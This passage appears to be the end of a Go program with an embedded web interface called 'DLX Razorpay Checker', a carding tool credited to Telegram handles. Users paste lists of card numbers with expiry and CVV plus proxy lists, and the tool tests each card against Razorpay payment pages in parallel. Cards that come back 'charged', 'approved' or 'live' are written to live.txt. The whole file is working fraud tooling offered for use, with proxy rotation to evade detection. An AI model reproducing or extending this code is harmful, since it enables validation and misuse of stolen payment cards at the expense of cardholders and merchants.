            border-radius: 50%;
            animation: floatUp 15s infinite;
        }

        @keyframes floatUp {
            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
            10% { opacity: 0.3; }
            90% { opacity: 0.3; }
            100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; }
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* Header */
        .header {
            text-align: center;
            padding: 40px 0;
            margin-bottom: 30px;
            animation: fadeInDown 0.8s ease-out;
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header h1 {
            font-size: 3.5rem;
            background: linear-gradient(135deg, #ff6b6b, #ff8e53, #ff6b6b);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 3s ease infinite;
            letter-spacing: 3px;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .header p {
            color: rgba(255,255,255,0.7);
            margin-top: 10px;
            font-size: 1rem;
        }

        .badge {
            display: inline-flex;
            gap: 12px;
            margin-top: 20px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .badge span {
            background: rgba(255,107,107,0.15);
            color: #ff6b6b;
            padding: 6px 18px;
            border-radius: 30px;
            font-size: 0.8rem;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,107,107,0.3);
            transition: all 0.3s ease;
        }

        .badge span:hover {
            transform: translateY(-2px);
            background: rgba(255,107,107,0.25);
        }

        /* Cards */
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            animation: fadeInUp 0.6s ease-out;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card:hover {
            border-color: rgba(255,107,107,0.5);
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .card-title {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ff8e53;
            display: flex;
            align-items: center;
            gap: 12px;
            border-left: 3px solid #ff6b6b;
            padding-left: 15px;
        }

        /* Grid */
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 24px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: rgba(255,255,255,0.8);
            font-size: 0.85rem;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        input, select, textarea {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: #fff;
            font-size: 0.9rem;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #ff6b6b;
            background: rgba(0,0,0,0.6);
            box-shadow: 0 0 20px rgba(255,107,107,0.2);
        }

        input::placeholder, textarea::placeholder {
            color: rgba(255,255,255,0.3);
        }

        /* Buttons */
        .btn-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-top: 10px;
        }

        button {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            border: none;
            padding: 12px 28px;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            position: relative;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        button:hover::before {
            width: 300px;
            height: 300px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-secondary {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }

        .btn-secondary:hover {
            background: rgba(255,255,255,0.2);
            box-shadow: none;
        }

        /* Loading Animation */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Results Table */
        .results-container {
            max-height: 500px;
            overflow-y: auto;
            border-radius: 16px;
        }

        .results-table {
            width: 100%;
            border-collapse: collapse;
        }

        .results-table th,
        .results-table td {
            padding: 14px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.08);
        }

        .results-table th {
            color: #ff8e53;
            font-weight: 600;
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: rgba(0,0,0,0.3);
            position: sticky;
            top: 0;
        }

        .results-table tr {
            transition: all 0.3s ease;
        }

        .results-table tr:hover {
            background: rgba(255,107,107,0.1);
            transform: scale(1.01);
        }

        /* Status Badges */
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .status-charged { background: rgba(0,255,136,0.2); color: #00ff88; border: 1px solid rgba(0,255,136,0.3); }
        .status-approved { background: rgba(78,205,196,0.2); color: #4ecdc4; border: 1px solid rgba(78,205,196,0.3); }
        .status-live { background: rgba(255,204,0,0.2); color: #ffcc00; border: 1px solid rgba(255,204,0,0.3); }
        .status-declined { background: rgba(255,107,107,0.2); color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); }

        /* Stats Panel */
        .stats-panel {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }

        .stat-card {
            flex: 1;
            background: rgba(0,0,0,0.3);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: rgba(255,107,107,0.3);
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stat-label {
            font-size: 0.8rem;
            color: rgba(255,255,255,0.6);
            margin-top: 5px;
        }

        /* Progress Bar */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 20px;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff6b6b, #ff8e53);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 2px;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.05);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(255,107,107,0.5);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255,107,107,0.8);
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 30px;
            border-top: 1px solid rgba(255,255,255,0.05);
            margin-top: 30px;
            color: rgba(255,255,255,0.4);
            font-size: 0.75rem;
        }

        /* Responsive */
        @media (max-width: 968px) {
            .grid-2 { grid-template-columns: 1fr; }
            .header h1 { font-size: 2rem; }
            .stat-card { min-width: 120px; }
        }

        /* Animations */
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #333;
            color: #fff;
            padding: 12px 24px;
            border-radius: 12px;
            z-index: 10000;
            animation: fadeInUp 0.3s ease-out;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }

        .toast-success { background: linear-gradient(135deg, #00b4db, #0083b0); }
        .toast-error { background: linear-gradient(135deg, #ff6b6b, #ff4757); }
        .toast-info { background: linear-gradient(135deg, #ff8e53, #ff6b6b); }
    </style>
</head>
<body>
    <div class="bg-animation" id="bgAnimation"></div>

    <div class="container">
        <div class="header">
            <h1>⚡ DLX RAZORPAY CHECKER</h1>
            <p>Professional Card Checker Tool with Real-time Results</p>
            <div class="badge">
                <span>🏆 v2.0</span>
                <span>📢 @dlxdropp</span>
                <span>💻 @deluxe_cc</span>
                <span>⚡ High Performance</span>
                <span>🔒 Secure</span>
            </div>
        </div>

        <div class="grid-2">
            <div>
                <div class="card">
                    <div class="card-title">🔧 Configuration</div>
                    <div class="form-group">
                        <label>🌐 Site URL</label>
                        <input type="text" id="siteUrl" placeholder="https://pages.razorpay.com/..." value="https://pages.razorpay.com/pl_KjJwqXPzZv5R5k">
                    </div>
                    <div class="form-group">
                        <label>💰 Amount (INR)</label>
                        <input type="number" id="amount" value="1" min="1" step="1">
                    </div>
                    <div class="form-group">
                        <label>⚡ Threads</label>
                        <select id="threads">
                            <option value="1">1 Thread (Slow)</option>
                            <option value="3" selected>3 Threads (Recommended)</option>
                            <option value="5">5 Threads (Fast)</option>
                            <option value="10">10 Threads (Very Fast)</option>
                            <option value="20">20 Threads (Extreme)</option>
                        </select>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">🔄 Proxy Settings</div>
                    <div class="form-group">
                        <label>📝 Proxy List (one per line)</label>
                        <textarea id="proxies" rows="5" placeholder="ip:port&#10;ip:port:user:pass&#10;http://user:pass@ip:port"></textarea>
                    </div>
                    <div class="btn-group">
                        <button onclick="loadProxyFile()" class="btn-secondary">📁 Load from px.txt</button>
                        <button onclick="clearProxies()" class="btn-secondary">🗑️ Clear</button>
                    </div>
                </div>
            </div>

            <div>
                <div class="card">
                    <div class="card-title">💳 Card Input</div>
                    <div class="form-group">
                        <label>📝 Cards (Format: CC|MM|YY|CVV)</label>
                        <textarea id="cards" rows="8" placeholder="4111111111111111|12|26|123&#10;5555555555554444|10|25|456&#10;378282246310005|12|27|1234"></textarea>
                    </div>
                    <div class="btn-group">
                        <button onclick="checkCards()" id="checkBtn">🚀 START CHECK</button>
                        <button onclick="loadCardFile()" class="btn-secondary">📁 Load from cards.txt</button>
                        <button onclick="clearAll()" class="btn-secondary">🗑️ Clear All</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stats Panel -->
        <div class="stats-panel" id="statsPanel" style="display: none;">
            <div class="stat-card">
                <div class="stat-number" id="statTotal">0</div>
                <div class="stat-label">Total Cards</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="statApproved">0</div>
                <div class="stat-label">Approved/Live</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="statDeclined">0</div>
                <div class="stat-label">Declined</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="statTime">0</div>
                <div class="stat-label">Time (seconds)</div>
            </div>
        </div>

        <!-- Progress Bar -->
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <!-- Results Panel -->
        <div class="card">
            <div class="card-title">
                <span>📊</span> Live Results
                <span id="resultBadge" style="font-size:0.7rem; margin-left:auto;"></span>
            </div>
            <div class="results-container">
                <table class="results-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Card Number</th>
                            <th>Amount</th>
                            <th>Status</th>
                            <th>Message</th>
                            <th>Time</th>
                            <th>Proxy</th>
                        </tr>
                    </thead>
                    <tbody id="resultsBody">
                        <tr>
                            <td colspan="7" style="text-align:center; padding: 60px;">
                                <div class="loading-spinner"></div>
                                <p style="margin-top: 15px;">Ready to check cards...</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <div class="footer">
            <p>DLX Razorpay Checker v2.0 | Professional Card Checking Tool</p>
            <p style="margin-top: 5px;">Channel: @dlxdropp | Coder: @deluxe_cc</p>
        </div>
    </div>

    <script>
        let isChecking = false;
        
        // Background animation
        function createBubbles() {
            const bg = document.getElementById('bgAnimation');
            for (let i = 0; i < 80; i++) {
                const bubble = document.createElement('div');
                const size = Math.random() * 60 + 10;
                bubble.style.width = size + 'px';
                bubble.style.height = size + 'px';
                bubble.style.left = Math.random() * 100 + '%';
                bubble.style.animationDelay = Math.random() * 15 + 's';
                bubble.style.animationDuration = Math.random() * 10 + 10 + 's';
                bubble.style.background = 'rgba(255, 107, 107, ' + (Math.random() * 0.15) + ')';
                bg.appendChild(bubble);
            }
        }
        
        createBubbles();
        
        function showToast(message, type) {
            const toast = document.createElement('div');
            toast.className = 'toast toast-' + type;
            toast.innerHTML = message;
            document.body.appendChild(toast);
            setTimeout(function() { toast.remove(); }, 3000);
        }
        
        async function checkCards() {
            if (isChecking) return;
            
            const siteUrl = document.getElementById('siteUrl').value;
            const amount = parseFloat(document.getElementById('amount').value);
            const threads = parseInt(document.getElementById('threads').value);
            const proxiesText = document.getElementById('proxies').value;
            const cardsText = document.getElementById('cards').value;
            
            if (!cardsText.trim()) {
                showToast('Please enter cards!', 'error');
                return;
            }
            
            const cards = cardsText.split('\n').filter(function(c) { return c.trim() && c.includes('|'); });
            
            if (cards.length === 0) {
                showToast('No valid cards found! Format: CC|MM|YY|CVV', 'error');
                return;
            }
            
            isChecking = true;
            
            const checkBtn = document.getElementById('checkBtn');
            const originalText = checkBtn.innerHTML;
            checkBtn.innerHTML = '<span class="loading-spinner"></span> CHECKING...';
            checkBtn.disabled = true;
            
            document.getElementById('statsPanel').style.display = 'flex';
            document.getElementById('progressBar').style.display = 'block';
            document.getElementById('resultsBody').innerHTML = '';
            
            const tbody = document.getElementById('resultsBody');
            
            for (let i = 0; i < Math.min(cards.length, 10); i++) {
                const row = tbody.insertRow();
                row.innerHTML = '<td>' + (i + 1) + '</td><td><span class="loading-spinner" style="width:14px;height:14px;"></span> Checking...</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td>';
            }
            
            const proxies = proxiesText.split('\n').filter(function(p) { return p.trim(); });
            
            const response = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    site_url: siteUrl,
                    amount: amount,
                    threads: threads,
                    proxies: proxies,
                    cards: cards
                })
            });
            
            const result = await response.json();
            
            tbody.innerHTML = '';
            
            let approved = 0, declined = 0;
            
            result.results.forEach(function(r, idx) {
                const row = tbody.insertRow();
                let statusClass = '';
                let statusText = r.status.toUpperCase();
                
                if (r.status === 'charged') {
                    statusClass = 'status-charged';
                    approved++;
                } else if (r.status === 'approved') {
                    statusClass = 'status-approved';
                    approved++;
                } else if (r.status === 'live') {
                    statusClass = 'status-live';
                    approved++;
                } else {
                    statusClass = 'status-declined';
                    declined++;
                }
                
                const cardDisplay = r.card.length > 16 ? r.card.slice(0,6) + '******' + r.card.slice(-4) : r.card;
                
                row.innerHTML = '<td>' + (idx + 1) + '</td>' +
                    '<td style="font-family:monospace;">' + cardDisplay + '</td>' +
                    '<td>₹' + r.amount + '</td>' +
                    '<td><span class="status-badge ' + statusClass + '">' + statusText + '</span></td>' +
                    '<td style="font-size:0.8rem;">' + (r.message || 'Success') + '</td>' +
                    '<td>' + (r.time || '0') + 's</td>' +
                    '<td style="font-size:0.7rem;">' + (r.proxy || 'DIRECT') + '</td>';
                
                const progress = ((idx + 1) / result.results.length) * 100;
                document.getElementById('progressFill').style.width = progress + '%';
            });
            
            document.getElementById('statTotal').innerText = result.total;
            document.getElementById('statApproved').innerText = approved;
            document.getElementById('statDeclined').innerText = declined;
            document.getElementById('statTime').innerText = result.total_time || 0;
            
            const badge = document.getElementById('resultBadge');
            badge.innerHTML = '<span style="color:#00ff88;">✓ ' + approved + '</span> | <span style="color:#ff6b6b;">✗ ' + declined + '</span> | ⚡ ' + (result.total_time || 0) + 's';
            
            checkBtn.innerHTML = originalText;
            checkBtn.disabled = false;
            isChecking = false;
            
            setTimeout(function() {
                document.getElementById('progressBar').style.display = 'none';
                document.getElementById('progressFill').style.width = '0%';
            }, 2000);
            
            showToast('Check completed! ' + approved + ' approved, ' + declined + ' declined', 'success');
        }
        
        async function loadProxyFile() {
            const response = await fetch('/api/load-proxy');
            const data = await response.json();
            if (data.proxies) {
                document.getElementById('proxies').value = data.proxies;
                showToast('Proxies loaded from px.txt', 'success');
            } else {
                showToast('px.txt not found!', 'error');
            }
        }
        
        async function loadCardFile() {
            const response = await fetch('/api/load-cards');
            const data = await response.json();
            if (data.cards) {
                document.getElementById('cards').value = data.cards;
                showToast('Cards loaded from cards.txt', 'success');
            } else {
                showToast('cards.txt not found!', 'error');
            }
        }
        
        function clearProxies() {
            document.getElementById('proxies').value = '';
            showToast('Proxies cleared', 'info');
        }
        
        function clearAll() {
            document.getElementById('cards').value = '';
            document.getElementById('resultsBody').innerHTML = '<tr><td colspan="7" style="text-align:center; padding:60px;"><p>Ready to check cards...</p></td></tr>';
            document.getElementById('statsPanel').style.display = 'none';
            document.getElementById('resultBadge').innerHTML = '';
            document.getElementById('progressBar').style.display = 'none';
            showToast('Cleared', 'info');
        }
    </script>
</body>
</html>`
    w.Header().Set("Content-Type", "text/html")
    w.Write([]byte(htmlContent))
}

// ============================================================
// LEGACY HANDLER
// ============================================================

func handleLegacy(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
    match := re.FindStringSubmatch(r.URL.Path)

    if len(match) < 2 {
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]string{"status": "error", "response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}", "proxy": "N/A"})
        return
    }

    cardData, _ := url.QueryUnescape(match[1])
    card, err := parseCard(cardData)
    if err != nil {
        w.WriteHeader(http.StatusBadRequest)
        json.NewEncoder(w).Encode(map[string]string{"status": "error", "response": "Invalid card format. Use: cc|mm|yy|cvv", "proxy": "N/A"})
        return
    }

    proxyList := loadProxies("px.txt")
    proxy := getNextProxy(proxyList)
    targetURL := getNextURL()

    kyid, plink, ppid, keylessHeader, _ := extractMerchantData(targetURL, proxy)
    sessid, _ := getSessionToken(proxy)

    result := checkCardWithData(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL, kyid, plink, ppid, keylessHeader, sessid, 100)

    proxyDisplay := result.Proxy + " [" + result.ProxyStatus + "]"
    logLive(card, result)
    logResult(card, result, proxyDisplay, targetURL)

    json.NewEncoder(w).Encode(map[string]string{"status": result.Status, "response": result.Message, "proxy": proxyDisplay})
}

func logLive(card *ParsedCard, result CheckResult) {
    if result.Status == "charged" || result.Status == "approved" {
        line := fmt.Sprintf("%s|%s|%s|%s - %s - %s\n", card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
        f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err == nil {
            f.WriteString(line)
            f.Close()
        }
    }
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
    first6 := card.CC
    if len(first6) > 6 {
        first6 = first6[:6]
    }
    last4 := card.CC
    if len(last4) > 4 {
        last4 = last4[len(last4)-4:]
    }
    middle := strings.Repeat("*", len(card.CC)-10)
    if len(middle) < 6 {
        middle = "******"
    }
    log.Printf("[%s] %s%s%s | %s | %s | Site: %s", strings.ToUpper(result.Status), first6, middle, last4, result.Message, proxyDisplay, targetURL)
}

// ============================================================
// MAIN
// ============================================================

func main() {
    log.SetFlags(log.Ldate | log.Ltime)

    http.HandleFunc("/", serveIndex)
    http.HandleFunc("/api/check", handleAPICheck)
    http.HandleFunc("/api/load-proxy", handleLoadProxy)
    http.HandleFunc("/api/load-cards", handleLoadCards)
    http.HandleFunc("/razorpay/cc=", handleLegacy)

    addr := fmt.Sprintf("0.0.0.0:%d", PORT)
    log.Printf("=========================================================")
    log.Printf("  DLX RAZORPAY CARD CHECKER - GO VERSION")
    log.Printf("  Listening on: http://%s", addr)
    log.Printf("  Web Interface: http://%s", addr)
    log.Printf("  API Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
    log.Printf("  Channel: @dlxdropp | Coder: @deluxe_cc")
    log.Printf("=========================================================")

    if err := http.ListenAndServe(addr, nil); err != nil {
        log.Fatalf("Server failed: %v", err)
    }
}